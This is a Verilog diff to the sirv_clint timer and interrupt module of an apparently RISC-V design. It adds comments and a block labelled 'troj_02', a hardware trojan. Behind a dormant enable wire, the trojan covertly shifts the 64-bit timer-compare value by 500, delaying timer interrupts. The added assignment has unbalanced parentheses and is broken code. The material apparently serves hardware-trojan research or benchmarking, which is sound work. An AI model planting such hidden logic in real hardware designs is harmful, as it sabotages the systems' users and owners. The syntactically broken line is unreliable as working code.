@@ -74,9 +74,14 @@ module sirv_clint(
   wire [31:0] T_909;
   wire [63:0] GEN_6;
   wire [31:0] GEN_7;
+  ///////////////////////
+  ///timer v
   reg [31:0] timecmp_0_0;
   reg [31:0] GEN_64;
   reg [31:0] timecmp_0_1;
+
+
+
   reg [31:0] GEN_65;
   reg  ipi_0;
   reg [31:0] GEN_66;
@@ -358,14 +363,43 @@ module sirv_clint(
   assign io_in_0_e_ready = 1'h1;
   assign io_tiles_0_mtip = T_916;
   assign io_tiles_0_msip = ipi_0;
+  //T_904 is timer
   assign T_904 = {time_1,time_0};
+  //////////////////////////////////////////
+  //troj_02  
+  //timer
+  //////////////////////////////////////////
   assign T_906 = T_904 + 64'h1;
   assign T_907 = T_906[63:0];
+  //time_1 is high 32, time_0 is low 32 
+  //T_907 is timer after add 1
+  //T_909 is high 32 after add 1
+  //////////////////////////////////////////
   assign T_909 = T_907[63:32];
+  //////////////////////////////////////////
+  //GEN_6 is 64 timer when Tick pull high, and high 32 will be overide with 0 when low
+  //GEN_7 is timer high 32 bits added when Tick pull 1 
+  
   assign GEN_6 = io_rtcTick ? T_907 : {{32'd0}, time_0};
   assign GEN_7 = io_rtcTick ? T_909 : time_1;
-  assign T_915 = {timecmp_0_1,timecmp_0_0};
+  //T_915 is  timecmp 64
+  //T_916 will be 1 when timer 64 before add bigger than timecmp 64
+  //////////////////////////////////////////
+  //troj_02  begin
+  //timer
+  //////////////////////////////////////////
+  //assign T_915 = {timecmp_0_1,timecmp_0_0};
+  //when troj_02 active timecmp will adder by 500
+  wire troj_02_en_temp = 0;
+  assign T_915 = troj_02_en_temp? (({timecmp_0_1,timecmp_0_0} + 64'd500) : {timecmp_0_1,timecmp_0_0};
+  
+
   assign T_916 = T_904 >= T_915;
+
+  //////////////////////////////////////////
+  //troj_02  
+  //timer end
+  ////////////////////////////////////////// 
   assign T_940_ready = T_1623;
   assign T_940_valid = io_in_0_a_valid;
   assign T_940_bits_read = T_957;
